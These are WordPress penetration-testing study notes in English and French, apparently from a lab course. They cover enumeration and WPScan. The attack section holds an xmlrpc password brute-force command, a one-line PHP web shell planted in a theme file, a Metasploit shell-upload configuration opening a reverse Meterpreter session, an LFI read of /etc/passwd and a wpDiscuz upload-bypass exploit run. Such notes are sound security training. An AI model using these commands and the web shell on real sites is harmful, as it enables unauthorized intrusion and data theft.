# Content Management Systems (CMS)  
## WordPress – Discovery & Enumeration

### Introduction

- **WordPress** (2003) → open-source CMS, PHP-based, usually Apache + MySQL.  
- **Extremely popular**: ~32.5% of all sites on the internet.  
- **Highly customizable**, SEO-friendly → but vulnerable through **themes/plugins**.  

**Stats**:  
- 50k+ plugins, 4,100+ themes.  
- 317 versions released.  
- 661+ new WP sites built daily.  
- 120+ languages supported.  
- Hacks: **8% weak passwords**, **60% outdated installs**.  
- Vulnerabilities (per WPScan): 54% plugins, 31.5% core, 14.5% themes.  

**Big names using WordPress**: NYT, eBay, Sony, Forbes, Disney, Facebook, Mercedes-Benz.  

### Discovery / Footprinting

#### `robots.txt`
Exemple typique :
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://site.local/wp-sitemap.xml
```

- Présence de `/wp-admin` + `/wp-content` = **WordPress détecté**.  
- `/wp-admin` → redirige souvent vers `/wp-login.php`.

### Structure
- **Plugins** → `/wp-content/plugins/`  
- **Themes** → `/wp-content/themes/`  

### Types d’utilisateurs
- **Admin** → gestion complète (users, code).  
- **Editor** → gérer/publier posts (même ceux d’autres).  
- **Author** → gérer/publier ses propres posts.  
- **Contributor** → écrire posts, mais pas publier.  
- **Subscriber** → simple utilisateur (lecture + profil).  

➡️ **Accès admin = souvent RCE possible**.

## Enumeration

### Identifier WordPress
`curl -s http://blog.site.local | grep WordPress`

Exemple retour : `<meta name="generator" content="WordPress 5.8" />`

### Identifier le thème
`curl -s http://blog.site.local/ | grep themes`

Exemple retour : `.../wp-content/themes/business-gravity/...`

### Identifier les plugins
`curl -s http://blog.site.local/ | grep plugins`

Exemple retour :  
- **Contact Form 7** (`ver=5.4.2`)  
- **mail-masta** (`ver=1.0.0`)  
- **wpDiscuz** (`ver=7.0.4`)
  
## User Enumeration

- Login page : `/wp-login.php`  

- **User valide + mauvais mot de passe** →  
  `"The password for username admin is incorrect."`

- **User invalide** →  
  `"The username someone is not registered on this site."`

➡️ Fuite d’information → **username enumeration**.  

Exemple : `admin` confirmé.

## Automated Enumeration – WPScan

### Installation
`sudo gem install wpscan`

### Aide
`wpscan -h`

### Exemple scan
`sudo wpscan --url http://blog.site.local --enumerate --api-token TOKEN`

### Résultats typiques
- **Server** → Apache/2.4.41 (Ubuntu).  
- **XML-RPC enabled** → brute-force possible.  
- **readme.html exposé**.  
- **Upload dir listing enabled**.  
- **WordPress version 5.8** (vulnérable REST API, XSS).  
- **Theme Transport Gravity** (child de Business Gravity).  
- **Plugins détectés** : mail-masta (LFI, SQLi), wpDiscuz, Contact Form 7.  
- **Users** : `admin`, `john`.

## Moving On
Avec ces infos, nous pouvons maintenant :  
- Planifier l’exploitation (RCE via plugins, brute-force, LFI/SQLi).  
- Explorer la surface d’attaque restante.  
- Démontrer comment **un simple WordPress mal configuré** mène à **compromission totale**.

---

# Attaquer WordPress

## Bruteforce de connexion

WPScan peut effectuer des attaques par mot de passe (`xmlrpc` ou `wp-login`). `xmlrpc` est généralement plus rapide.

Exemple de commande :
`sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

Sortie (exemple) :
[!] Valid Combinations Found:  
| Username: john, Password: firebird1

Options importantes :
- `--password-attack` : méthode d'attaque (`xmlrpc` ou `wp-login`)  
- `-U` : utilisateur(s) ou fichier de noms d'utilisateurs  
- `-P` : mot de passe(s) ou fichier de mots de passe  
- `-t` : threads

## Exécution de code via l’éditeur de thème

Avec un compte disposant d'un rôle suffisant (ex. `administrator`), on peut éditer les fichiers du thème depuis Appearance → Theme Editor.

Procédé :
1. Se connecter (ex. `john:firebird1`).  
2. Aller dans Appearance → Theme Editor.  
3. Choisir un thème alternatif (inactif) pour éviter d’endommager le thème principal (ex. `Twenty Nineteen`).  
4. Éditer un fichier comme `404.php` et y ajouter une ligne minimale pour exécution :

`system($_GET[0]);`

Puis appeler la page modifiée :
`curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id"`

Exemple de sortie :
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

## Module Metasploit : `wp_admin_shell_upload`

Metasploit fournit un module `exploit/unix/webapp/wp_admin_shell_upload` qui authentifie sur WordPress, upload un plugin malveillant, le déclenche et ouvre une session Meterpreter PHP.

Exemple de configuration minimale :
- `set USERNAME john`  
- `set PASSWORD firebird1`  
- `set LHOST 10.10.14.15`  
- `set RHOST 10.129.42.195`  
- `set VHOST blog.inlanefreight.local`

Après `exploit`, le module téléverse et exécute le payload ; si tout se passe bien on obtient une session Meterpreter (ou autre reverse shell).

## Exploitation de plugins connus (exemples)

### mail-masta (LFI / SQLi)
Code vulnérable (extrait) :
`include($_GET['pl']);`
Cela permet un Local File Inclusion non filtré. Exemple d'exfiltration :
`curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"`

Résultat attendu : contenu de `/etc/passwd`.

### wpDiscuz (upload bypass → RCE)
Version vulnérable : `7.0.4` (exemple). Le plugin devait seulement autoriser des images mais sa vérification MIME peut être contournée, permettant l'upload d'un webshell `.php`.

Exemple d'utilisation d'un PoC/exploit script (résumé) :
- lancer le script d'exploit ciblant la page de post : `python3 wp_discuz.py -u http://blog.inlanefreight.local -p "/?p=1"`
- si l'upload réussit, le script renvoie l'URL du webshell uploadé, ex. :  
  `http://blog.inlanefreight.local/wp-content/uploads/2021/08/nom-xxxx.php`
- exécuter une commande via :  
  `curl "http://.../nom-xxxx.php?cmd=id"`

Sortie potentielle :
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---



